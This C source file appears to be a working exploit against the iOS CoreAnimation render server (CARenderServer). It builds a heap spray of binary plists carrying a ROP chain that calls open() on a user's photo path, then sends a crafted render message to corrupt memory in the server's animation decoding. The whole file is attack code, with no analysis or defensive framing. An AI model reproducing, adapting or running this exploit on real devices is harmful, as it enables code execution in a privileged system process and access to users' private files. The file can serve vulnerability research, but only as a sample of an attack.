#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>

#include <CoreFoundation/CoreFoundation.h>

#include "offsets.h"
#include "rop.h"
#include "tfc.h"

extern kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);

kern_return_t fetch_mach_service_port(const char *service_name, mach_port_name_t *service_port) {

    mach_port_t bs_port = MACH_PORT_NULL;

    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bs_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] Get bootstrap port failed: %s\n", mach_error_string(kr));
        return kr;
    }

    kr = bootstrap_look_up(bs_port, service_name, service_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] bootstrap_look_up failed: %s\n", mach_error_string(kr));
    } else {
        printf("[+] service_port = 0x%x\n", *service_port);
    }
    return kr;
}

uint64_t EXPAND64(uint8_t c) {
    uint16_t e1 = (uint16_t)c << 8 | c;
    uint32_t e2 = (uint32_t)e1 << 16 | e1;
    return (uint64_t)e2 << 32 | e2;
}

#define ASSIGN_AND_AHEAD(p, type, value)                                                           \
    do {                                                                                           \
        *(type *)p = (type)value;                                                                  \
        p += sizeof(type);                                                                         \
    } while (0)

#define ASSIGN_STRING_AND_AHEAD(p, c, length)                                                      \
    do {                                                                                           \
        ASSIGN_AND_AHEAD(p, int32_t, length);                                                      \
        for (size_t i = 0; i < length / 8; i++)                                                    \
            *(uint64_t *)(p + i * 8) = EXPAND64((c) + i);                                          \
        p += length;                                                                               \
    } while (0)

void build_render_message_body(uint8_t *body, uint32_t length, uint32_t context_id) {

    uint8_t *p = body;

    // CA::Render::Decoder::Decoder()
    ASSIGN_AND_AHEAD(p, int32_t, 0x41414141);
    ASSIGN_AND_AHEAD(p, int32_t, context_id);
    ASSIGN_AND_AHEAD(p, int64_t, 0x43434343);

    // CA::Render::decode_commands()
    ASSIGN_AND_AHEAD(p, int8_t, 2);
    ASSIGN_AND_AHEAD(p, int64_t, 0x44444444);
    ASSIGN_AND_AHEAD(p, int32_t, 0x44444444);

    // CA::Render::Decoder::decode_object()
    ASSIGN_AND_AHEAD(p, int8_t, 0xF); // ExternalAnimation object

    // CA::Render::Animation::Animation
    ASSIGN_AND_AHEAD(p, int16_t, 0x4444);
    ASSIGN_AND_AHEAD(p, int32_t, 0x88888888);
    /* CA::Render::Timing::Timing */
    ASSIGN_AND_AHEAD(p, int16_t, 0x1111);
    ASSIGN_AND_AHEAD(p, int32_t, 0x41414141);
    ASSIGN_AND_AHEAD(p, int64_t, 0x42424242);
    ASSIGN_AND_AHEAD(p, int64_t, 0x42424242);
    ASSIGN_AND_AHEAD(p, int64_t, 0x42424242);
    ASSIGN_AND_AHEAD(p, int64_t, 0x42424242);
    ASSIGN_AND_AHEAD(p, int64_t, 0x42424242);

    ASSIGN_AND_AHEAD(p, int32_t, 0x4);
    memset(p, 'C', 0x20);
    p += 0x20;

    // CA::Render::Decoder::decode_cfobject()
    ASSIGN_AND_AHEAD(p, int8_t, 2); // CString
    ASSIGN_AND_AHEAD(p, int8_t, 0x1);
    ASSIGN_AND_AHEAD(p, int64_t, 0x40);
    memset(p, 'A', 0x40);
    p += 0x40;

    ASSIGN_AND_AHEAD(p, int32_t, 0x43434343);

    ASSIGN_AND_AHEAD(p, int16_t, 0x00);

    ASSIGN_AND_AHEAD(p, int8_t, 0x11); // Function

    ASSIGN_AND_AHEAD(p, int8_t, 1);
    ASSIGN_AND_AHEAD(p, int8_t, 10); // name index

    ASSIGN_AND_AHEAD(p, int64_t, 0x41414141);
    ASSIGN_AND_AHEAD(p, int32_t, 0x41414141);

    return;
}

void build_spray_payload(uint8_t *payload, uint32_t length) {

#define PAYLOAD_SLICE_SIZE 0x1000
    TFC_ASSERT(length % 0x1000 == 0);

    uint64_t payload_bytes[] = {
        /* |+0x00| */ 0x160000008, // this + 0x10
        /* |+0x08| */ 0x00,
        /* |+0x10| */ 0x00,
        /* |+0x18| */ 0x160000020,
        /* |+0x20| */ gadget_descs[0].address ^ 0x160000008, // PC  TODO
        /* |+0x28| */ lib_infos[0].loaded_address + OBJC_CTYPE_OFFSET,
        /* |+0x30| */ 0x00,
        /* |+0x38| */ 0x160000000 + 0x50,
        /* |+0x40| */ 0x00,
        /* |+0x48| */ 0x00,
        /* |+0x50| */ 0x160000000 + 0x68,
        /* |+0x58| */ gadget_descs[4].address,
        /* |+0x60| */ gadget_descs[1].address,
        /* |+0x68| */ 0x00,
        /* |+0x70| */ gadget_descs[3].address,
        /* |+0x78| */ gadget_descs[2].address,
        /* |+0x80| */ 0x11111111,
        /* |+0x88| */ 0x22222222,

        /* |+0x90| */ 0x33333333,              // X29
        /* |+0x98| */ gadget_descs[5].address, // X30
        /* |+0xA0| */ 0x55555555,
        /* |+0xA8| */ 0x66666666,

        /* |+0xB0| */ 0x160000800, // X0 --> path for open()
        /* |+0xB8| */ 0x00,        // X1 --> O_RDONLY for open()
        /* |+0xC0| */ 0x99999999,
        /* |+0xC8| */ 0x11111111,
        /* |+0xD0| */ 0x22222222,
        /* |+0xD8| */ (uint64_t)open + 12, // BR __open()
        /* |+0xE0| */ 0x44444444,
        /* |+0xE8| */ 0x55555555,
        /* |+0xF0| */ 0x66666666,

    };

    TFC_ASSERT(sizeof(payload_bytes) <= PAYLOAD_SLICE_SIZE / 2);

    for (size_t i = 0; i < length / PAYLOAD_SLICE_SIZE; i++) {
        memcpy(payload + i * PAYLOAD_SLICE_SIZE, payload_bytes, sizeof(payload_bytes));
        strcpy((char *)payload + i * PAYLOAD_SLICE_SIZE + 0x800,
               "/var/mobile/Media/DCIM/100APPLE/IMG_0001.PNG");
    }
}

kern_return_t ca_register_client(mach_port_t service, mach_port_t *context_port,
                                 uint32_t *context_id) {

    typedef struct ca_register_client_request_s ca_register_client_request_t;
    typedef struct ca_register_client_reply_s ca_register_client_reply_t;

#pragma pack(4)
    struct ca_register_client_request_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t ports[3];
        NDR_record_t NDR;
        uint32_t unk;
    };
#pragma pack(0)

#pragma pack(4)
    struct ca_register_client_reply_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        NDR_record_t NDR;
        uint32_t context_id;
        uint32_t unk2;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        ca_register_client_request_t request;
        ca_register_client_reply_t reply;
    } message;
    memset(&message, 0, sizeof(message));

    ca_register_client_request_t *request = &message.request;
    ca_register_client_reply_t *reply = &message.reply;

    request->header.msgh_bits =
        MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 40202;

    request->msgh_body.msgh_descriptor_count = 3;

    mach_port_t normal_port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &normal_port);

    for (size_t i = 0; i < 3; i++) {
        /*request->ports[i].name = normal_port;*/
        request->ports[i].name = MACH_PORT_NULL;
        request->ports[i].type = MACH_MSG_PORT_DESCRIPTOR;
        request->ports[i].disposition = MACH_MSG_TYPE_MAKE_SEND;
    }

    request->NDR = NDR_record;

    mach_msg_return_t ret =
        mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                 request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret != KERN_SUCCESS) {
        printf("[-] _XRegisterClient() failed: %s\n", mach_error_string(ret));
        return 0;
    }

    if (context_port)
        *context_port = reply->port.name;
    if (context_id)
        *context_id = reply->context_id;

    return KERN_SUCCESS;
}

kern_return_t ca_register_client_options(mach_port_t service, mach_port_t port, void *spray_buffer,
                                         uint32_t spray_length, mach_port_t *context_port,
                                         uint32_t *context_id) {

    typedef struct ca_register_client_options_request_s ca_register_client_options_request_t;
    typedef struct ca_register_client_options_reply_s ca_register_client_options_reply_t;

#pragma pack(4)
    struct ca_register_client_options_request_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t ports[3];
        mach_msg_ool_descriptor_t options;
        NDR_record_t NDR;
        uint32_t unk;
        uint32_t options_len;
    };
#pragma pack(0)

#pragma pack(4)
    struct ca_register_client_options_reply_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t context_port;
        NDR_record_t NDR;
        uint32_t context_id;
        uint32_t unk;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        ca_register_client_options_request_t request;
        ca_register_client_options_reply_t reply;
    } message;
    memset(&message, 0, sizeof(message));

    ca_register_client_options_request_t *request = &message.request;
    ca_register_client_options_reply_t *reply = &message.reply;

    request->header.msgh_bits =
        MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 40203;

    request->msgh_body.msgh_descriptor_count = 4;

    for (size_t i = 0; i < 3; i++) {
        request->ports[i].name = port;
        request->ports[i].type = MACH_MSG_PORT_DESCRIPTOR;
        request->ports[i].disposition = MACH_MSG_TYPE_MAKE_SEND;
    }

    request->options.address = spray_buffer;
    request->options.copy = 1;
    request->options.deallocate = 0;
    request->options.type = MACH_MSG_OOL_DESCRIPTOR;
    request->options.size = spray_length;

    request->NDR = NDR_record;
    request->unk = 0;
    request->options_len = spray_length;

    mach_msg_return_t ret =
        mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                 request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if (ret != KERN_SUCCESS) {
        printf("[-] _XRegisterClientOptions() failed: %s\n", mach_error_string(ret));
        return 0;
    }

    if (context_port)
        *context_port = reply->context_port.name;
    if (context_id)
        *context_id = reply->context_id;

    return KERN_SUCCESS;
}

kern_return_t send_render_message(mach_port_t service, uint32_t context_id) {

#define MESSAGE_PORT_COUNT 8

    typedef struct render_message_s render_message_t;
#pragma pack(4)
    struct render_message_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t ool;
        mach_msg_port_descriptor_t ports[MESSAGE_PORT_COUNT];
    };
#pragma pack(0)

    render_message_t message;
    memset(&message, 0, sizeof(message));

#define RENDER_MESSAGE_BODY_SIZE (0x400L * 0x400)

    uint8_t *render_message_body = malloc(RENDER_MESSAGE_BODY_SIZE);
    TFC_ASSERT(render_message_body != NULL);
    memset(render_message_body, 0, RENDER_MESSAGE_BODY_SIZE);
    build_render_message_body(render_message_body, RENDER_MESSAGE_BODY_SIZE, context_id);

    message.header.msgh_bits = MACH_MSGH_BITS(19, 0) | MACH_MSGH_BITS_COMPLEX;
    message.header.msgh_size = sizeof(message);
    message.header.msgh_remote_port = service;
    message.header.msgh_local_port = MACH_PORT_NULL;
    message.header.msgh_voucher_port = MACH_PORT_NULL;
    message.header.msgh_id = 40003;

    message.msgh_body.msgh_descriptor_count = MESSAGE_PORT_COUNT + 1;

    message.ool.address = render_message_body;
    message.ool.copy = 1;
    message.ool.deallocate = 0;
    message.ool.type = MACH_MSG_OOL_DESCRIPTOR;
    message.ool.size = RENDER_MESSAGE_BODY_SIZE;

    mach_port_t normal_port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &normal_port);

    for (size_t i = 0; i < MESSAGE_PORT_COUNT; i++) {
        message.ports[i].name = normal_port;
        message.ports[i].type = MACH_MSG_PORT_DESCRIPTOR;
        message.ports[i].disposition = MACH_MSG_TYPE_MAKE_SEND;
    }

    mach_msg_return_t ret = mach_msg(&message.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                                     (mach_msg_size_t)sizeof(message), 0, MACH_PORT_NULL,
                                     MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    free(render_message_body);

    return ret;
}

kern_return_t do_heap_spray(mach_port_t service_port) {

    const uint32_t spray_length = 0x20000;
    uint8_t *spray_data = malloc(spray_length);
    TFC_ASSERT(spray_data != NULL);
    build_spray_payload(spray_data, spray_length);

#define ARRAY_COUNT 0x100
    CFMutableArrayRef array = CFArrayCreateMutable(0, ARRAY_COUNT, &kCFTypeArrayCallBacks);
    for (int i = 0; i < ARRAY_COUNT; i++) {
        CFDataRef data = CFDataCreate(0, spray_data, spray_length);
        CFArrayAppendValue(array, data);
        CFRelease(data);
    }
    CFStringRef key_name = CFStringCreateWithCString(0, "ss", kCFStringEncodingUTF8);
    const void *keys[] = {key_name};
    const void *values[] = {array};
    CFDictionaryRef dict =
        CFDictionaryCreate(0, (const void **)keys, (const void **)values, 1,
                           &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CFErrorRef error = NULL;
    CFDataRef plistdata = CFPropertyListCreateData(kCFAllocatorDefault, dict,
                                                   kCFPropertyListBinaryFormat_v1_0, 0, &error);

    char *data_ptr = (char *)CFDataGetBytePtr(plistdata);
    CFIndex data_len = CFDataGetLength(plistdata);

    mach_port_t port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);

#define SPRAY_COUNT 0x38
    for (size_t i = 0; i < SPRAY_COUNT; i++) {
        mach_port_t context_port = MACH_PORT_NULL;
        uint32_t context_id = 0;
        ca_register_client_options(service_port, port, data_ptr, data_len, &context_port,
                                   &context_id);
        /*printf("[*] context_port = 0x%x, context_id = 0x%x\n", context_port, context_id);*/
    }

    CFRelease(key_name);
    CFRelease(array);
    CFRelease(dict);
    CFRelease(plistdata);

    printf("[*] do_heap_spray() done!\n");
    return KERN_SUCCESS;
}

int go() {

	rop_init();

    mach_port_t service_port = MACH_PORT_NULL;
    fetch_mach_service_port("com.apple.CARenderServer", &service_port);

	do_heap_spray(service_port);

    uint32_t context_id = 0;
    mach_port_t context_port = MACH_PORT_NULL;
    ca_register_client(service_port, &context_port, &context_id);
    send_render_message(context_port, context_id);

   

    return 0;
}
